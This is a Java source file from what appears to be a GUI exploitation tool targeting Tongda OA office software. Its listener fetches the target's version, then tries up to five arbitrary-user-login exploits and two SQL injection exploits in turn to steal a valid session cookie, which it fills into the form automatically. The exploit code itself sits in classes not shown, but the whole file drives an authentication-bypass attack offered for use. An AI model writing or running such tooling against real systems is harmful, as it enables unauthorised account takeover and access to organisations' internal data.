package com.xinyu.view;


import com.xinyu.poc.*;
import com.xinyu.tools.Other;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.regex.Pattern;

public class GetCookieActionListener implements ActionListener {
    private JTextField field_url; //目标地址
    private JTextField field_cookie; //Cookie
    private TextArea textArea; //多行文本框,显示程序运行状态
    private String version = null;

    public GetCookieActionListener(JTextField field_url, JTextField field_cookie, TextArea textArea) {
        this.field_url = field_url;
        this.field_cookie = field_cookie;
        this.textArea = textArea;
    }


    @Override
    public void actionPerformed(ActionEvent e) {
        String url = Other.dataCleaning(field_url.getText() + "/", Pattern.compile("(https?://.*?)/"));
        this.version = Other.getVersion(url);
        if (version != null) {
            textArea.append("\n*******\n当前通达OA版本为: " + version);
        } else {
            textArea.append("\n网站不可访问");
        }
        String session = getSession(url);
        this.field_cookie.setText(session);


    }


    /**
     * 循环判断可用的poc,成功绕过登录返回session,停止执行
     *
     * @param url
     * @return
     */
    public String getSession(String url) {
        //任意用户登录
        String[] pocArray = {"poc1", "poc2", "poc3", "poc4", "poc5"}; //默认poc排序
        String session = null;
        if (this.version.equals("11.7")) {
            pocArray = new String[]{"poc5"};
        }


        textArea.append("\n正在尝试利用任意用户登录漏洞获取Cookie...");
        int i = 0;
        do {
            System.out.println("i=" + i);
            session = ArbitraryUserLogin.getSession(url, pocArray[i]);
            if (session == null) {
                textArea.append("\n" + pocArray[i] + "利用失败");
            } else {
                textArea.append("\n" + pocArray[i] + "利用成功\n已自动填充");
            }
            i++;
        } while ((session == null) && (i < pocArray.length));

        //SQL注入
        if (session == null) {
            String[] pocArray2 = {"poc1", "poc2"};
            textArea.append("\n正在尝试利用SQL注入漏洞获取Cookie...");
            int j = 0;
            do {
                System.out.println("j=" + j);
                session = SQLInjection.getSession(url, pocArray2[j]);
                if (session == null) {
                    textArea.append("\n" + pocArray2[j] + "利用失败");
                } else {
                    textArea.append("\n" + pocArray2[j] + "利用成功\n已自动填充");
                }
                j++;
            } while ((session == null) && (j < pocArray2.length));
        }
        return session;
    }


}
